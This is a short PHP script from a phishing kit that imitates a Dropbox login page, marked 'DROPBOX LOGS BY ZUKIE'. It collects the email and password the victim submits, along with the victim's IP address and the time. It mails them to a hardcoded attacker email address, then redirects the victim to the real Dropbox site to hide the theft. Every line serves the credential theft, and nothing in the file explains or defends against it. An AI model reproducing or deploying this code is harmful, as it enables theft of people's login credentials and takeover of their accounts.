<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "====================================\n";
$msg .= "DROPBOX LOGS BY ZUKIE\n";
$msg .= "===================================\n";
$msg .= "Email : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "IP Address $ip on $time\n";
$msg .= "====================================\n";

$to ="raythomas112@yahoo.com";
$subject = "DROPBOX $ip";
$from = "From: DROPBOX<raythomas112@yahoo.com>";

mail($to,$subject,$msg,$from);

header("Location: http://www.dropbox.com");


?>